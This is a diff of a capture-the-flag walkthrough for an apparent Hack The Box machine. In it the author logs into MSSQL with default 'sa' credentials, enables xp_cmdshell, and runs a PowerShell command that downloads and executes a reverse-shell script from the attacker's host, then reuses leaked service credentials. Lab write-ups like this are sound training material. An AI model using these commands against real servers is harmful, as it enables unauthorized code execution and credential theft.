@@ -69,8 +69,37 @@ we notice **sa** credentials
 ```
 sa is the defult admin account for connecting and managing the MSSQL Database
 ``` 
-so let's try to use it to login with it 
-we can use this command we will use impacket tool
+### 🧩 Attempting MSSQL Access with `impacket-mssqlclient`
+
+We try to connect to the MSSQL service using **default `sa` credentials**.
+
+### 🛠️ Command:
+
 ```bash
 impacket-mssqlclient escapetwo.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
 ```
+![](../pics/sql.png)
+Cool now we have to enable xp_cmdshell to be able to execute commands on the system we can enable it by : 
+```bash
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+ ```
+ ![](../pics/sqls.png)
+ okay let's get reverse shell on the machine 
+ first we will need to craft our powershell script to give us reverse shell
+ ![](../pics/shell.png)
+ then we will run python server and make the machine to download it by this command :
+ ```powershell
+ EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.16.2/shellx.ps1'')"';
+```
+Boom we got reverse shell now :
+![](../pics/frommachine.png)
+after some digging i found configuration file leaking sql_svc information 
+```bash
+Wqxxxxxxxxxxxxxxxx
+```
+Also i found user called ryan : 
+![](../pics/ryan.png)
+Lets use these credintials to login and try to get the user flag : 
+![](../pics/userflag.png)
+we got the user flag now 
